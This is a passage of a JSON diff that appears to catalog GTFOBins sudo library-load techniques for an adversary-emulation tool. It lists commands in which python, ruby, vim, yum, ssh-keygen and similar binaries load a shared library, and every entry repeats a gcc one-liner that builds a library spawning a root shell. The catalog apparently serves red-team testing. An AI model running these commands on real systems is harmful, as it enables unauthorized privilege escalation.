+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:python:library-load:0:sudo::",
+        "source_name": "python",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `python` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rake:library-load:0:sudo:0:rake>ruby",
+      "name": "GTFOBINS - T1574 - rake - Library load - Sudo [9487633]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: rake. Context: Sudo. This allows to run Ruby code (`...`). Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rake -p '...'\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rake",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rake",
+        "source_bin": "rake",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "rake",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "rake",
+            "ruby"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rake:library-load:0:sudo:0:rake>ruby",
+        "source_name": "rake",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `rake` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ruby:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - ruby - Library load - Sudo [e8e848a]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: ruby. Context: Sudo.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ruby",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ruby",
+        "source_bin": "ruby",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ruby:library-load:0:sudo::",
+        "source_name": "ruby",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `ruby` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:sqlmap:library-load:0:sudo:0:sqlmap>python",
+      "name": "GTFOBINS - T1574 - sqlmap - Library load - Sudo [63c0c14]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: sqlmap. Context: Sudo. This allows to run Python code (`...`). Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "sqlmap -u 127.0.0.1 --eval='...'\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/sqlmap",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/sqlmap",
+        "source_bin": "sqlmap",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "sqlmap",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "sqlmap",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:sqlmap:library-load:0:sudo:0:sqlmap>python",
+        "source_name": "sqlmap",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `sqlmap` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ssh-keygen:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - ssh-keygen - Library load - Sudo [b61dacd]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: ssh-keygen. Context: Sudo. The shared library must contain the `void C_GetFunctionList() {}` function.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ssh-keygen -D #{lotl_gtfobins_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ssh-keygen",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ssh-keygen",
+        "source_bin": "ssh-keygen",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ssh-keygen:library-load:0:sudo::",
+        "source_name": "ssh-keygen",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `ssh-keygen` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:tclsh:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - tclsh - Library load - Sudo [78afabf]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: tclsh. Context: Sudo.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "tclsh\nload #{lotl_gtfobins_payload_path} x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/tclsh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/tclsh",
+        "source_bin": "tclsh",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:tclsh:library-load:0:sudo::",
+        "source_name": "tclsh",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `tclsh` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:vagrant:library-load:0:sudo:0:vagrant>ruby",
+      "name": "GTFOBINS - T1574 - vagrant - Library load - Sudo [6c954f8]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: vagrant. Context: Sudo. This allows to run Ruby code (`...`). Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >Vagrantfile\nvagrant up\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/vagrant",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/vagrant",
+        "source_bin": "vagrant",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "vagrant",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "vagrant",
+            "ruby"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:vagrant:library-load:0:sudo:0:vagrant>ruby",
+        "source_name": "vagrant",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `vagrant` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:vim:library-load:0:sudo:0:vim>python",
+      "name": "GTFOBINS - T1574 - vim - Library load - Sudo [d314e48]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: vim. Context: Sudo. This allows to run Python code (`...`). Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "vim -c ':py ...'\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/vim",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/vim",
+        "source_bin": "vim",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "vim",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "vim",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:vim:library-load:0:sudo:0:vim>python",
+        "source_name": "vim",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `vim` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:volatility:library-load:0:sudo:0:volatility>python",
+      "name": "GTFOBINS - T1574 - volatility - Library load - Sudo [116495f]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: volatility. Context: Sudo. Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "volatility -f /path/to/core-dump volshell\n...\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/volatility",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/volatility",
+        "source_bin": "volatility",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "volatility",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "volatility",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:volatility:library-load:0:sudo:0:volatility>python",
+        "source_name": "volatility",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `volatility` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:wish:library-load:0:sudo:0:wish>tclsh",
+      "name": "GTFOBINS - T1574 - wish - Library load - Sudo [6fcd506]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: wish. Context: Sudo. Inherits library-load behavior from tclsh.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "wish\ntclsh\nload #{lotl_gtfobins_payload_path} x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/wish",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/wish",
+        "source_bin": "wish",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "tclsh",
+        "inheritance_path": [
+          "wish",
+          "tclsh"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "tclsh",
+          "inheritance_path": [
+            "wish",
+            "tclsh"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:wish:library-load:0:sudo:0:wish>tclsh",
+        "source_name": "wish",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `wish` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:yum:library-load:0:sudo:0:yum>python",
+      "name": "GTFOBINS - T1574 - yum - Library load - Sudo [bdd1b1d]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: yum. Context: Sudo. This allows to run Python code (`...`). Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\npluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/yum",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/yum",
+        "source_bin": "yum",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "yum",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "yum",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:yum:library-load:0:sudo:0:yum>python",
+        "source_name": "yum",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `yum` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
